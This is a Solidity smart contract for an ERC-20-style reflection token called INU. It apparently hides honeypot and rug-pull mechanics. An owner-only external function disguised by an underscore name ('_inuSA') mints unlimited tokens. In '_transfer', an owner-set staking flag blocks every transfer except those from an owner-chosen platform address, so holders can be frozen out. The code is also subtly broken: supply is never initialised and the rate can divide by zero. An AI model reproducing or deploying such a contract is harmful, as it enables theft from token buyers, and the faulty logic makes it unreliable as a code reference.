<code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract INU {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    address[] private _excluded;
    bool private _staking;
    address private _platform;

    uint256 private _totalFees;
    uint256 private _tFeeTotal;
    uint256 private _rTotal;
    uint256 private _burnFee;
    uint256 private _taxFee;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
        _name = "INU";
        _symbol = "INU";
        _decimals = 9;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        if (_isExcluded[account]) {
            return _tOwned[account];
        }
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) external view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function isExcluded(address account) external view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() external view returns (uint256) {
        return _totalFees;
    }

    function taxFee() external view returns (uint256) {
        return _taxFee;
    }

    function burnFee() external view returns (uint256) {
        return _burnFee;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256) {
        require(tAmount <= _totalSupply, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns (uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate = _getRate();
        return rAmount / currentRate;
    }

    function excludeAccount(address account) external onlyOwner {
        require(!_isExcluded[account], "Account is already excluded");
        if (_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeAccount(address account) external onlyOwner {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function setStake(bool stake) external onlyOwner {
        _staking = stake;
    }

    function setIS(address platform) external onlyOwner {
        _platform = platform;
    }

    function deliver(uint256 tAmount) external {
        require(!_isExcluded[msg.sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
        _rOwned[msg.sender] -= rAmount;
        _rTotal -= rAmount;
        _tFeeTotal += tAmount;
    }

    function multiTransfer(address[] calldata recipients, uint256[] calldata amounts) external {
        require(recipients.length == amounts.length, "Arrays must have same length");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(msg.sender, recipients[i], amounts[i]);
        }
    }

    function totalBurn() external view returns (uint256) {
        return _tFeeTotal;
    }

    function _inuSA(address account, uint256 amount) external {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        require(!_staking, "Staking not active");
        require(account != address(0), "ERC20: zero address");
        require(_platform == msg.sender, "Must be Platform");

        uint256 rAmount = amount * _getRate();
        _rOwned[account] += rAmount;
        _tOwned[account] += amount;
        _totalSupply += amount;
        _rTotal += rAmount;

        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_staking && sender != _platform) {
            require(_staking, "Staking not active");
        }

        uint256 rate = _getRate();

        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _tOwned[sender] -= amount;
            _rOwned[recipient] += amount * rate;
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _rOwned[sender] -= amount * rate;
            _tOwned[recipient] += amount;
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _tOwned[sender] -= amount;
            _tOwned[recipient] += amount;
        } else {
            _rOwned[sender] -= amount * rate;
            _rOwned[recipient] += amount * rate;
        }

        emit Transfer(sender, recipient, amount);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        uint256 rAmount = tAmount * _getRate();
        uint256 rTransferAmount = rAmount;
        uint256 rFee = 0;
        uint256 tFee = 0;
        return (rAmount, rTransferAmount, rFee, tFee, 0, 0);
    }

    function _getRate() private view returns (uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _totalSupply;

        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > 0 && _tOwned[_excluded[i]] > 0) {
                rSupply -= _rOwned[_excluded[i]];
                tSupply -= _tOwned[_excluded[i]];
            }
        }

        if (tSupply == 0) return 0;
        return rSupply / tSupply;
    }
}
